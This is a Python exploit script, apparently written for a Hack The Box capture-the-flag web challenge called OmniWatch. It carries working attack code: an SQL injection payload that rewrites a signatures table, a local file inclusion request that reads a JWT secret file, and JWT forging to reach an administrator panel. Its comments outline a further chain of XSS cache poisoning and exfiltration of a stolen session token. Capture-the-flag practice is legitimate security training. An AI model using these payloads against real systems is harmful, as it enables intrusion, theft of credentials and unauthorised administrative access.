import time, urllib, requests, multiprocessing, base64, jwt, sys
from flask import Flask

# Remote target
HOST, PORT = "83.136.252.27", 56215
CHALLENGE_URL = f"http://{HOST}:{PORT}"

# We need to get our public IP for exfiltration
# For now, let's try to use the challenge directly without exfiltration server
# since we can't easily get a public callback URL

def url_encode(string):
    return urllib.parse.quote(string, safe="")

def str_to_hex(string):
    return "0x" + "".join([hex(ord(char))[2:] for char in string])

def base64_decode(encoded_string):
    decoded_bytes = base64.b64decode(encoded_string)
    decoded_string = decoded_bytes.decode("utf-8")
    return decoded_string

def create_jwt(payload, secret):
    return jwt.encode(payload, secret, algorithm="HS256")

def sql_injection(signature):
    encoded_signature = str_to_hex(signature)
    sqli_payload = f"';UPDATE signatures SET signature = {encoded_signature} WHERE user_id = 1#"
    encoded_sqli = url_encode(sqli_payload)
    return encoded_sqli

def get_flag(jwt_token):
    cookies = {
        "jwt": jwt_token
    }
    resp = requests.get(f"{CHALLENGE_URL}/controller/admin", cookies=cookies)
    
    if "HTB{" in resp.text:
        flag = "HTB{" + resp.text.split("HTB{")[1].split("}")[0] + "}"
        print(flag)
        return flag
    else:
        print("[-] Flag not found in response")
        print(resp.text[:200])
        return None

def add_malicious_signature(signature, old_jwt, new_jwt):
    print("[+] Adding malicious signature via sqli")
    
    sqli = sql_injection(signature)
    
    cookies = {
        "jwt": old_jwt
    }
    
    resp = requests.get(f"{CHALLENGE_URL}/controller/device/1{sqli}", cookies=cookies)
    print(f"[+] SQLi response status: {resp.status_code}")
    
    print("[+] Signature added, attempting to get flag")
    return get_flag(new_jwt)

def forge_jwt(secret, old_jwt):
    print("[+] Forging malicious jwt")
    
    jwt_payload = {
        "user_id": 1,
        "username": "lean",
        "account_type": "administrator"
    }
    
    new_jwt = create_jwt(jwt_payload, secret)
    jwt_signature = new_jwt.split(".")[-1]
    print(f"[+] New JWT signature: {jwt_signature[:20]}...")
    return add_malicious_signature(jwt_signature, old_jwt, new_jwt)

def leak_secret(moderator_jwt):
    print("[+] Leaking jwt secret via lfi")
    
    cookies = {
        "jwt": moderator_jwt
    }
    
    data = {
        "patch": "/app/jwt_secret.txt"
    }
    
    resp = requests.post(f"{CHALLENGE_URL}/controller/firmware", cookies=cookies, data=data)
    jwt_secret = resp.text
    
    print(f"[+] Secret leaked: {jwt_secret[:20]}...")
    return forge_jwt(jwt_secret, moderator_jwt)

# Alternative approach without needing exfiltration server
# We'll try to exploit directly if we can find credentials or bypass
def check_bot_status():
    try:
        resp = requests.get(f"{CHALLENGE_URL}/controller/bot_running", timeout=5)
        print(f"[*] Bot status: {resp.text}")
        return resp.text == "running"
    except Exception as e:
        print(f"[-] Error checking bot status: {e}")
        return False

if __name__ == "__main__":
    print("[*] OmniWatch Remote Exploit")
    print(f"[*] Target: {CHALLENGE_URL}")
    print()
    
    # Check if we can access bot status
    print("[1] Checking bot status endpoint...")
    check_bot_status()
    
    # For the full exploit, we need the moderator JWT which requires XSS + exfiltration
    # Let's see if there's another way or if we need to set up the exfiltration
    print("\n[*] This exploit requires:")
    print("  1. XSS cache poisoning to steal moderator JWT")
    print("  2. Exfiltration server to receive the JWT")
    print("  3. LFI to leak JWT secret")
    print("  4. SQL injection to add forged signature")
    print("  5. Access admin panel with forged JWT")
    print("\n[!] Need to set up exfiltration server or find alternative approach...")
